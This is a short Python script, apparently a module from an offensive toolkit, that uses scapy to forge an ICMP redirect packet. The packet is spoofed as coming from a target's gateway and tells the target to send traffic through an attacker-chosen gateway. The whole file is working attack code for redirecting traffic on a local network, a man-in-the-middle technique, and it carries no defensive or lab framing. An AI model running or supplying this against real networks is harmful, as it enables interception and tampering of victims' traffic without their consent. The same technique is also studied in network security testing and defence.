from scapy.all import *

def run(target_ip, gateway_ip, spoofed_gateway_ip):
    try:
        target_mac = getmacbyip(target_ip)
        if not target_mac:
            return f"[!] Failed to resolve MAC address for {target_ip}"

        ether = Ether(dst=target_mac)
        ip = IP(src=gateway_ip, dst=target_ip)
        icmp = ICMP(type=5, code=1, gw=spoofed_gateway_ip)
        redirect_payload = IP(src=target_ip, dst="8.8.8.8")/ICMP()

        packet = ether / ip / icmp / redirect_payload
        sendp(packet, verbose=0)

        return f"[+] ICMP Redirect sent to {target_ip}, spoofed gateway: {spoofed_gateway_ip}"
    except Exception as e:
        return f"[!] Error: {str(e)}"

